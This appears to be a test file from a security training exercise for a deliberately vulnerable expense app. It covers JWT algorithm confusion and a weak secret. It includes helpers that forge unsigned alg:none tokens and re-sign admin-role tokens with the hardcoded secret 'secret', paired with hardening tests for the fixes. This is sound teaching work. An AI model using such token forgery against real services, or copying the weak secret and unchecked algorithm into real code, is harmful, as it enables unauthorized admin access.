/**
 * Exercise 03 — JWT Abuse Test Suite
 *
 * HOW TO READ THESE TESTS
 * ───────────────────────
 * 🔴 EXPLOIT TESTS  — PASS when vulnerable, should FAIL after your fix.
 * 🟢 HARDENING TESTS — FAIL when vulnerable, should PASS after your fix.
 *
 * Run:  npm run test:03
 *
 * Note: These tests craft raw JWTs without using the login endpoint,
 * to simulate what an attacker would do.
 */

const request = require('supertest');
const jwt = require('jsonwebtoken');
const app = require('../../src/app');
const { JWT_SECRET } = require('../../src/auth');

// ─── HELPERS ──────────────────────────────────────────────────────────────────

async function getToken(username, password = 'password123') {
  const res = await request(app)
    .post('/api/auth/login')
    .send({ username, password });
  if (res.status !== 200) throw new Error(`Login failed for ${username}`);
  return res.body.token;
}

/**
 * Craft a JWT with alg:none — no signature required.
 * This is what Bug #7 allows to pass verification.
 */
function craftAlgNoneToken(payload) {
  const header  = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const body    = Buffer.from(JSON.stringify(payload)).toString('base64url');
  // alg:none tokens have an empty signature segment
  return `${header}.${body}.`;
}

/**
 * Re-sign a payload using the real JWT_SECRET.
 * Simulates what an attacker does after cracking the secret.
 */
function forgeSigned(payload) {
  return jwt.sign(payload, JWT_SECRET, { algorithm: 'HS256' });
}

// ─── SETUP ────────────────────────────────────────────────────────────────────

let validUserToken;

beforeAll(async () => {
  validUserToken = await getToken('alice');
});

// ─────────────────────────────────────────────────────────────────────────────
// BUG #7: Algorithm Confusion — alg:none token accepted
// ─────────────────────────────────────────────────────────────────────────────

describe('Bug #7 — JWT Algorithm Confusion (alg: none)', () => {

  // 🔴 EXPLOIT TEST
  test('🔴 [EXPLOIT] alg:none token with role:admin is accepted', async () => {
    const forgedToken = craftAlgNoneToken({
      userId: 99,
      role: 'admin',
      iat: Math.floor(Date.now() / 1000),
    });

    const res = await request(app)
      .get('/api/admin/users')
      .set('Authorization', `Bearer ${forgedToken}`);

    // When vulnerable: server accepts unsigned token claiming admin role
    expect(res.status).toBe(200);
    expect(res.body.flag).toBe('BAC{jwt_alg_none_accepted}');

    console.log('\n  🚩 FLAG CAPTURED:', res.body.flag);
    console.log('  Forged token (first 60 chars):', forgedToken.substring(0, 60) + '...');
  });

  // 🔴 EXPLOIT TEST
  test('🔴 [EXPLOIT] alg:none token grants access to protected routes', async () => {
    const forgedToken = craftAlgNoneToken({
      userId: 99,
      role: 'admin',
      iat: Math.floor(Date.now() / 1000),
    });

    // Try the approve route too
    const res = await request(app)
      .post('/api/expenses/approve/1')
      .set('Authorization', `Bearer ${forgedToken}`);

    expect(res.status).toBe(200);
  });

  // 🟢 HARDENING TEST
  test('🟢 [HARDENING] alg:none token is rejected after fix', async () => {
    const forgedToken = craftAlgNoneToken({
      userId: 99,
      role: 'admin',
      iat: Math.floor(Date.now() / 1000),
    });

    const res = await request(app)
      .get('/api/admin/users')
      .set('Authorization', `Bearer ${forgedToken}`);

    // After adding { algorithms: ['HS256'] } to jwt.verify() — unsigned tokens rejected
    expect(res.status).toBe(401);
    expect(res.body.error).toMatch(/invalid|expired/i);
  });

  // 🟢 HARDENING TEST
  test('🟢 [HARDENING] Legitimate HS256 token still works after fix', async () => {
    // A real token from login should still be accepted
    const res = await request(app)
      .get('/api/expenses/mine')
      .set('Authorization', `Bearer ${validUserToken}`);

    expect(res.status).toBe(200);
  });

  // 🟢 HARDENING TEST
  test('🟢 [HARDENING] Tampered payload with valid structure is rejected', async () => {
    // Split a real token, tamper the payload, reassemble (breaks the signature)
    const parts = validUserToken.split('.');
    const tamperedPayload = Buffer.from(
      JSON.stringify({ userId: 4, role: 'admin' })
    ).toString('base64url');

    const tamperedToken = `${parts[0]}.${tamperedPayload}.${parts[2]}`;

    const res = await request(app)
      .get('/api/admin/users')
      .set('Authorization', `Bearer ${tamperedToken}`);

    expect(res.status).toBe(401);
  });

});

// ─────────────────────────────────────────────────────────────────────────────
// BUG #8: Weak JWT Secret — can be cracked, then re-signed
// ─────────────────────────────────────────────────────────────────────────────

describe('Bug #8 — Weak JWT Secret (crackable, re-signable)', () => {

  // 🔴 EXPLOIT TEST
  test('🔴 [EXPLOIT] JWT_SECRET is the word "secret" (trivially crackable)', async () => {
    // The secret is exported from auth.js — in real life the attacker
    // would crack this from a captured token using jwt-cracker or hashcat.
    expect(JWT_SECRET).toBe('secret');

    console.log('\n  ⚠️  JWT_SECRET =', JSON.stringify(JWT_SECRET));
    console.log('  This would be cracked instantly by jwt-cracker or hashcat.');
  });

  // 🔴 EXPLOIT TEST
  test('🔴 [EXPLOIT] Re-signed admin token using cracked secret is accepted', async () => {
    // Simulate post-crack: attacker now knows the secret and re-signs freely
    const forgedAdminToken = forgeSigned({
      userId: 99,
      role: 'admin',
      iat: Math.floor(Date.now() / 1000),
    });

    const res = await request(app)
      .get('/api/admin/users')
      .set('Authorization', `Bearer ${forgedAdminToken}`);

    // When the secret is weak: attacker's forged token is cryptographically valid
    expect(res.status).toBe(200);
    expect(res.body.flag).toBe('BAC{jwt_weak_secret_cracked}');

    console.log('\n  🚩 FLAG CAPTURED:', res.body.flag);
  });

  // 🟢 HARDENING TEST
  test('🟢 [HARDENING] JWT_SECRET should be a long random string (not a word)', () => {
    // After fix: JWT_SECRET should be loaded from env, not hardcoded
    // This test checks the minimum entropy bar: at least 32 characters,
    // not equal to 'secret' or other trivial values.
    const trivialSecrets = ['secret', 'password', 'jwt', 'key', '1234', 'changeme'];

    expect(JWT_SECRET.length).toBeGreaterThanOrEqual(32);
    expect(trivialSecrets).not.toContain(JWT_SECRET);
  });

  // 🟢 HARDENING TEST
  test('🟢 [HARDENING] Token signed with old (cracked) secret is rejected after rotation', async () => {
    // After rotating the secret, old tokens should be invalid
    const oldSecretToken = jwt.sign(
      { userId: 1, role: 'user' },
      'secret',              // the old cracked secret
      { algorithm: 'HS256' }
    );

    const res = await request(app)
      .get('/api/expenses/mine')
      .set('Authorization', `Bearer ${oldSecretToken}`);

    // If JWT_SECRET has been changed, this token (signed with 'secret') is invalid
    expect(res.status).toBe(401);
  });

  // 🟢 HARDENING TEST
  test('🟢 [HARDENING] Token signed with correct new secret still works', async () => {
    // After rotation: a fresh login produces a token with the new secret
    const res = await request(app)
      .get('/api/expenses/mine')
      .set('Authorization', `Bearer ${validUserToken}`);

    expect(res.status).toBe(200);
  });

});

// ─────────────────────────────────────────────────────────────────────────────
// EDGE CASES — apply regardless of which exercise you're on
// ─────────────────────────────────────────────────────────────────────────────

describe('General JWT Edge Cases', () => {

  test('Missing Authorization header → 401', async () => {
    const res = await request(app).get('/api/expenses/mine');
    expect(res.status).toBe(401);
  });

  test('Malformed Bearer token → 401', async () => {
    const res = await request(app)
      .get('/api/expenses/mine')
      .set('Authorization', 'Bearer notavalidjwt');
    expect(res.status).toBe(401);
  });

  test('Expired token → 401', async () => {
    const expiredToken = jwt.sign(
      { userId: 1, role: 'user' },
      JWT_SECRET,
      { algorithm: 'HS256', expiresIn: -1 } // already expired
    );

    const res = await request(app)
      .get('/api/expenses/mine')
      .set('Authorization', `Bearer ${expiredToken}`);

    expect(res.status).toBe(401);
  });

  test('Empty string token → 401', async () => {
    const res = await request(app)
      .get('/api/expenses/mine')
      .set('Authorization', 'Bearer ');
    expect(res.status).toBe(401);
  });

});
